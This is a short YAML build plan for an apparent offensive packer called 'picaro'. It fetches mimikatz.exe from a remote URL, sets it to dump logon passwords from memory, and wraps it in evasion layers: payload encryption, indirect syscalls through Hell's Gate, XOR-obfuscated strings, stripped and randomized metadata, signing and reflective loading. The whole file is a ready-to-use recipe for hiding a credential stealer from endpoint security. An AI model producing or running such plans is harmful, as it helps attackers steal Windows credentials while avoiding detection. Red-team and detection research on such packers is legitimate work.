# Example plan to pack mimikatz.exe.
# Usage: picaro build examples/plans/mimikatz.yaml

schema: 4
name: mimikatz-basic

build:
  payload:
    source: "https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe"
    args:
      - "privilege::debug"
      - "sekurlsa::logonpasswords"
    crypto:
      algo: xchacha20poly1305
      key: random

  stub:
    syscalls:
      mode: indirect
      resolver: hells_gate
    strings:
      strategy: xor

  output:
    path: ./dist/mimikatz_packed.exe
    arch: x64
    strip: true
    trim_paths: all
    resources:
      version_info:
        randomize: true
    sign:
      mode: lab

runtime:

  - technique: reflective_loading
